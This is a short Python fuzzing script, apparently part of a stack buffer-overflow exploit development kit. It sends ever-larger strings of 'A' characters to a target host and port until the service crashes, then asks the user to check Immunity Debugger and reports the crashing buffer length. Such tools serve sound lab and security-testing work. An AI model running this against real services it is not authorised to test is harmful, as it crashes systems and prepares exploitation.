#!/usr/bin/env python3

from utils import *
import socket
import sys

if __name__ == "__main__" :

    if len(sys.argv) != 4 :
        print("[!] Usage: {} 'target' 'port' 'step size'".format(sys.argv[0]))
        sys.exit(1)

    target = sys.argv[1]
    port   = int(sys.argv[2])
    step   = int(sys.argv[3])

    i = 1
    while True:
        buffer = "\x41" * step * i
        done = connect_send(target, port, buffer)
        if done :
            break
        i += 1
        print("________________________________________________\n")


    answer = input("[!] Check your Immunity Debugger, did the app crash ? (yes/no): ").strip()
    if get_answer(answer) :
        print("[*] The overflow value is >>> {} <<< for the buffer max size !".format(len(buffer)))
    else :
        print("[!] Restart the application and re-run this script with BIGGER STEP SIZE.")